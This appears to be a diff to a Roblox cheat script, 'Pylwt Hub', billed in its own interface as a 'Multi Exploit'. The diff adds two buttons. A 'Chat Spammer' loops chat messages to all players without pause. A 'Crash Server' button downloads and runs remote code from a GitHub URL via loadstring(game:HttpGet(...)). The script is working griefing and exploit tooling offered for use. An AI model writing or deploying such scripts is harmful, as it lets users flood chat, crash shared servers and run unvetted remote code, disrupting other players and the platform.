@@ -1,3 +1,6 @@
+-- RGB Pylwt Hub
+-- Made by Pylwt#6567
+
 local VLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vep1032/VepStuff/main/VL"))()
 local s = VLib:Window("Pylwt Hub", "Multi Exploit", "PLT")
 local ss = s:Tab("Main")
@@ -642,7 +645,16 @@ local args = {
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
 end
 end)
+ss:Button("Chat Spammer",function()
+    while true do wait(0) 
+
+        local A_1 = "MADE BY PYLWT HUB" local A_2 = "All" 
+        local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) end
+end)
 ss:Label("- -Broken Stuff- -")
+ss:Button("Crash Server",function()
+    loadstring(game:HttpGet("https://github.com/Pylwt/crash/blob/main/README.md", true))() 
+end)
 ss:Button("Void Spin",function() 
 power = 500 -- change this to make it more or less powerful
 game:GetService('RunService').Stepped:connect(function()
@@ -835,4 +847,4 @@ ss:Label("Thank you for choosing Pylwt Hub!")
 ss:Label("- - - - - - - - - - - - - - - - - - - - - - -")
 ss:Label("Theme: RGB Rainbow")
 ss:Label("Last Update: 20th Of July 2022")
-ss:Label("Version: 2.14")
+ss:Label("Version: 2.15")
